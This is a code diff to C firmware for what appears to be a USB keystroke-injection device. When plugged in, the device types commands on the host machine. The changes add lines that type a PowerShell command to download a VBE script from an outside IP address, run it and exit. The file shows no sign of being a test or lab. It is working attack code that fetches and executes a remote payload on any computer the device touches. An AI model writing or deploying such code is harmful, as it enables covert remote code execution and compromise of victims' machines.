@@ -178,9 +178,7 @@ int main(void)
 
 		__keyboard_send(Buffer_Win);
 
-		__keyboard_send(buffer_release);
-		
-
+		__keyboard_send(buffer_release);	
 		
 		//keyboard_send_string("CMD\n\n");
 		//keyboard_send_string("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
@@ -191,42 +189,11 @@ int main(void)
 		__keyboard_send(buffer_release);
 		/****************************************************/
 		
-		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://192.168.138.131:8080/tips', 'D:\\tips')\n");
-#if 0
-		__keyboard_send(buffer_c);
-
-		__keyboard_send(buffer_release);
-
-		__keyboard_send(buffer_m);
-
-		__keyboard_send(buffer_release);
-
-		__keyboard_send(buffer_d);
-
-		__keyboard_send(buffer_release);
-
-
-		__keyboard_send(buffer_enter);
-
-		__keyboard_send(buffer_release);
-
-		__keyboard_send(buffer_enter);
-
-		__keyboard_send(buffer_release);
-#endif
-		//Delay(10000);
-		//keyboard_send_ascii('c');
-		//Delay(10000);
-		//keyboard_send_ascii('m');
-		//Delay(10000);
-		//keyboard_send_ascii('d');
-
-#if 0
-    if (JoyState() != 0)
-    {
-      Joystick_Send(JoyState());
-    }
-#endif
+		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n");
+		keyboard_send_string("D:\\test.vbe\n");
+		keyboard_send_string("exit\n");
+		
+		break;
   }
 }
 
